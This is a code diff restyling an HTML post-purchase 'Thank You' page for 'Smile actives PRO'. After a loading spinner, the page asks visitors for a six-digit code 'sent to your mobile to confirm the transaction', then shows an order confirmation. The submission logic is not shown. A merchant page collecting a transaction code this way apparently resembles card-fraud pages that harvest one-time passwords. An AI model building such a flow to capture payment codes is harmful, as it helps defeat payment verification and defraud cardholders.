@@ -7,131 +7,137 @@
     <title>Thank You</title>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
     <link href='https://fonts.googleapis.com/css?family=Montserrat' rel='stylesheet' type='text/css'>
-   <style>
-    body, h1, h2, h4, p, label {
-        font-family: 'Montserrat', sans-serif;
-        color: #000; /* Black color text */
-        background-color: #FFFFFF; /* Light gray background */
-    }
-
-    .spinner-container,
-    .thanks-container,
-    .otp-container {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-        text-align: center;
-        background-color: #f5f5f5;
-    }
-
-    .spinner {
-        border: 4px solid rgba(0, 0, 0, 0.1);
-        width: 50px;
-        height: 50px;
-        border-radius: 50%;
-        border-left-color: #000; /* Black color for spinner's left border */
-        animation: spin 0.5s linear infinite; /* Speeded up the animation */
-        margin-bottom: 1rem;
-    }
-
-    @keyframes spin {
-        0% {
-            transform: rotate(0deg);
+    <style>
+        /* Base Styles */
+        body {
+            font-family: 'Montserrat', sans-serif;
+            color: #000;
+            background-color: #F5F5F7; /* Apple's background color */
         }
-        100% {
-            transform: rotate(360deg);
+
+        /* Spinner */
+        .spinner-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            background-color: #F5F5F7; /* Apple's background color */
         }
-    }
 
-      .otp-container-2 {
-        background-color: #fff;  /* Pure white background for OTP section */
-        padding: 30px;
-        border: 1px solid #e1e1e1;  /* Light gray border for OTP section */
-        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);  /* Slightly deeper shadow for depth */
-        border-radius: 12px;  /* Rounded corners, typical of Apple design */
-        width: 70%;
-    }
+        .spinner {
+            border: 4px solid #E1E1E6; /* Apple's gray border */
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            border-left-color: #000;
+            animation: spin 0.5s linear infinite;
+            margin-bottom: 1rem;
+        }
 
-    .otp-container-2 h2 {
-        color: #000;  /* Black text color */
-        font-weight: 500;  /* Medium font weight for the header */
-        margin-bottom: 20px;
-    }
+        /* OTP Styles */
+        .otp-container-2 {
+            background-color: #FFF; /* Apple's pure white background */
+            padding: 30px;
+            border: 1px solid #E1E1E6; /* Apple's gray border */
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.07); /* Soft shadow */
+            border-radius: 12px;
+            width: 50%; /* Adjusted for a wider OTP container */
+            margin: 50px auto;
+        }
 
-    .otp-container-2 p {
-        color: #7d7d7d;  /* Gray text color */
-        margin-bottom: 20px;
-    }
+        .otp-container-2 h2 {
+            color: #000;
+            font-weight: 600;
+        }
 
-    /* OTP Inputs */
-    .otp-container-2 .otp-inputs {
-        display: flex;
-        justify-content: space-between;
-        max-width: 260px;  
-        margin: 20px auto;  /* Center the inputs */
-    }
+        .otp-container-2 p {
+            color: #8E8E93; /* Apple's gray text color */
+            margin-bottom: 30px;
+        }
 
-    .otp-container-2 .otp-inputs input {
-        border: 2px solid #e1e1e1;  /* Light gray border */
-        font-size: 22px;
-        background-color: #f9f9f9;  /* Slightly grayish background for input fields */
-        color: #000;  /* Black text */
-        width: 35px;
-        height: 45px;
-        text-align: center;
-        border-radius: 8px;  /* Rounded corners for input fields */
-        transition: box-shadow 0.3s, border-color 0.3s;
-    }
+        .otp-inputs {
+            display: flex;
+            justify-content: space-between;
+            max-width: 260px;
+            margin: 0 auto;
+        }
 
-    .otp-container-2 .otp-inputs input:focus {
-        border-color: #000;  /* Black border on focus */
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);  /* Shadow on focus */
-    }
+        .otp-inputs input {
+            border: 2px solid #E1E1E6;
+            font-size: 24px;
+            background-color: #F5F5F7; /* Apple's background color */
+            color: #000;
+            width: 35px;
+            height: 50px;
+            text-align: center;
+            border-radius: 8px;
+            transition: box-shadow 0.3s, border-color 0.3s;
+        }
 
-    /* Confirmation Button */
-    .btn-2 {
-        background-color: #000;  /* Black background */
-        color: #fff;  /* White text */
-        padding: 10px 25px;
-        border: none;
-        border-radius: 25px;  /* Deeply rounded corners */
-        margin-top: 30px;
-        cursor: pointer;
-        transition: background-color 0.3s, transform 0.2s;
-    }
+        .otp-inputs input:focus {
+            border-color: #007AFF; /* Apple's blue color */
+            box-shadow: 0 0 5px rgba(0, 119, 255, 0.3);
+        }
 
-    .btn-2:hover {
-        background-color: #333;  /* Dark gray on hover */
-        transform: scale(1.05);  /* Slight growth on hover */
-    }
+        /* Button Styles */
+        .btn-2 {
+            background-color: #000;
+            color: #FFF;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s;
+            font-weight: 600;
+        }
 
-    /* Hide the OTP and thank you sections initially */
-    .otp-container {
-        display: none;
-    }
+        .btn-2:hover {
+            background-color: #444; /* Darker gray on hover */
+            transform: scale(1.05);
+        }
 
-    .thanks-container {
-        display: none;
-    }
+        /* Thank You Styles */
+        .thanks-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            text-align: center;
+            background-color: #F5F5F7; /* Apple's background color */
+        }
 
-    .thanks-container img {
-        width: 50%;
-        height: auto;
-        margin-bottom: 2rem;
-    }
+        .thanks-container img {
+            width: 50%;
+            margin-bottom: 2rem;
+        }
 
-    .thanks-container h1 {
-        margin-bottom: 1.5rem;
-    }
+        .thanks-container h1 {
+            color: #000;
+            font-weight: 600;
+        }
 
-    .logo {
-        width: 60%;
-        margin-bottom: 20px;
-    }
-</style>
+        .thanks-container .lead {
+            color: #8E8E93; /* Apple's gray text color */
+        }
 
+        /* Spin animation for spinner */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Hide OTP and Thank You initially */
+        .otp-container, .thanks-container {
+            display: none;
+        }
+    </style>
 </head>
 
 <body>
@@ -142,29 +148,26 @@
     </div>
 
     <!-- OTP Container -->
-    <div class="container">
-        <div class="row justify-content-center">
-            <div class="col-md-6 otp-container otp-container-2">
-                <img src="path-to-your-logo.png" alt="Your Logo" class="logo">
-                <h2>Please Confirm</h2>
-                <p>Enter the code sent to your mobile to confirm the transaction:</p>
-                <div class="otp-inputs">
-                    <input type="text" maxlength="1">
-                    <input type="text" maxlength="1">
-                    <input type="text" maxlength="1">
-                    <input type="text" maxlength="1">
-                    <input type="text" maxlength="1">
-                    <input type="text" maxlength="1">
-                </div>
-                <button class="btn-2" onclick="submitOTP()">Confirm</button>
+    <div class="otp-container">
+        <div class="otp-container-2">
+            <h2>Please Confirm</h2>
+            <p>Enter the code sent to your mobile to confirm the transaction:</p>
+            <div class="otp-inputs">
+                <input type="text" maxlength="1">
+                <input type="text" maxlength="1">
+                <input type="text" maxlength="1">
+                <input type="text" maxlength="1">
+                <input type="text" maxlength="1">
+                <input type="text" maxlength="1">
             </div>
+            <button class="btn-2" onclick="submitOTP()">Confirm</button>
         </div>
     </div>
 
     <!-- Thanks Container -->
-    <div class="container thanks-container">
+    <div class="thanks-container">
         <img src="images/sa-2022-logo.png" alt="Logo">
-        <h1 class="display-4">Thank You For purchasing Smile actives PRO!</h1>
+        <h1>Thank You For purchasing Smile actives PRO!</h1>
         <p class="lead">Your order number is #SA339868. Please note that orders take 1-3 days to be processed and shipping times vary between 5 and 7 business days.</p>
         <a class="btn btn-primary" href="index.html">Continue Shopping</a>
     </div>
@@ -176,5 +179,3 @@
 </body>
 
 </html>
-
-
